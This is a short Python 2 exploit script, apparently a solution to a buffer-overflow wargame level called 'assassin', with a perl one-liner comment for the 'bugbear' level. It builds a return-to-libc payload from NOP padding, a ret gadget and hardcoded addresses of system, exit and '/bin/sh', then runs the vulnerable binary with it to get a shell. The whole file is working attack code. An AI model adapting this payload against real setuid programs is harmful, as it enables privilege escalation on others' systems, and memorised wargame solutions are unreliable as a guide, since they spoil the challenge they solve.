import os, sys

print "Assassin Exploit by Phantom"
print "[+] Making Exploit......"

victim = "/home/giant/assassin"
NOP = "\x90"*44


system = "\xe0\x8a\x05\x40"
exit = "\xe0\x91\x03\x40"
binsh = "\xf9\xbf\x0f\x40"
ret = "\x1e\x85\x04\x08"

payload = NOP + ret + system + exit + binsh

print "[+] Victim : " + victim
print "[+] Exploiting Assassin vuln.."
print "[+] Loading payload..."
print "[+] Shellcode length : ", len(payload)
print

os.execv(victim, ("", payload))
#./bugbear $(perl -e 'print "\xbf"x44, "\xe0\x8a\x05\x40", "cccc", "\xf9\xbf\x0f\x40"')